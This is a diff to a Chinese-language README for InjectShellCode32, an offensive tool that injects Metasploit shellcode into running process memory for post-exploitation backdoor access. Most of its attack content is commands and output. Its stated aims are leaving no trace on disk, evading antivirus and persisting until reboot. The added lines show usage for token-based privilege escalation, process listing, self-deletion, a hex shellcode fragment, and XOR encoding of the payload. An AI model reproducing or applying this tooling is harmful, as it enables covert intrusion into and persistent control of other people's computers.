@@ -2,7 +2,9 @@
 
 <br>
 
-一款本地通用ShellCode后门注入器，该工具主要用于在后渗透阶段使用，可将后门直接注入到特定进程内存中而不会在磁盘中留下任何痕迹，注入成功后Metasploit即可获取控制权，只要对端不关机则权限会一直维持，由于内存注入无对应磁盘文件，所以也不会触发杀软报毒。
+一款本地`ShellCode`后门注入工具，工具主要用于在后渗透阶段使用，可将后门直接注入到特定进程内存中而不会在磁盘中留下任何痕迹，注入成功后`Metasploit`即可获取控制权，只要对端不关机则权限会一直维持，由于内存注入无对应磁盘文件，所以也不会触发杀软报毒。
+
+
 
 首先需要通过`Metasploit`工具生成一个有效载荷，如下是32位与64位载荷生成命令。
 ```BASH
@@ -34,28 +36,63 @@ msf6 exploit(multi/handler) > exploit
  - 列举出目前系统中支持注入的进程
 ```C
 InjectShellCode32.exe --show
+
+[*] x32 进程PID =>      4        进程名 => System
+[*] x32 进程PID =>    124        进程名 => Registry
+[*] x32 进程PID =>    588        进程名 => smss.exe
+[*] x32 进程PID =>    836        进程名 => csrss.exe
+[*] x32 进程PID =>    940        进程名 => wininit.exe
+[*] x32 进程PID =>    948        进程名 => csrss.exe
+[*] x32 进程PID =>   1012        进程名 => services.exe
 ```
 
  - 尝试使用令牌提权
 ```C
 InjectShellCode32.exe --promote
+
+[+] 获取自身Token
+[+] 查询进程特权
+[*] 已提升为管理员
 ```
 
  - 删除自身程序
 ```C
 InjectShellCode32.exe --delself
+
+[*] 自身已清除
 ```
 
  - 将攻击载荷格式化为一行纯字符串
 ```C
+"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
+"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
+"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
+"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
+
 InjectShellCode32.exe Format --path d://shellcode.txt
 
-fce88f0000006089e531d2648b52308b520c8b52148b722831ff0fb74a2631c0ac3c601d630000687773325f54684......
+fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...
 ```
 
  - 将攻击载荷格式化为一行并写出到文本
 ```C
-InjectShellCode32.exe FormatFile --path d://shellcode.txt --output d://format.txt
+"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
+"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
+"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
+"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
+
+InjectShellCode32.exe FormatFile --path d://shellcode.txt --output d://output_shellcode.txt
+[+] 已储存 => d://output_shellcode.txt
+```
+
+ - 将一行攻击载荷进行异或处理
+
+```C
+InjectShellCode32.exe Xor --path d://output_shellcode.txt --passwd lyshark
+
+% &{{%ssssssuspr'q{z&vuw{!vqps{!vqs {!vqrws%!tw"qu{!tqq{pr%%pr s" p urt sqq qs r %s'sr twztv&%vqvt{!vqrs{!wqp sr's{!wst{%s!v"qvuu"ssvp%%'v
 ```
 
 
@@ -64,15 +101,6 @@ InjectShellCode32.exe FormatFile --path d://shellcode.txt --output d://format.tx
 
 
 
-
-
-
-**加密/解密攻击载荷:** 如上我们可以将shellcode压缩为一行，然后可以调用xor命令，对这段shellcode进行加密处理。
-```
-C:\Users\admin\Desktop> sc32.exe Xor --path d://format.txt --passwd lyshark
-
-% &{{%ssssssus{z&vpr'quw{!vqps{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'
-```
 
 **压缩载荷并转字节数组:** 将一段已经压缩过的shellcode代码转换为字节数组格式，这个格式可以直接使用。
 ```
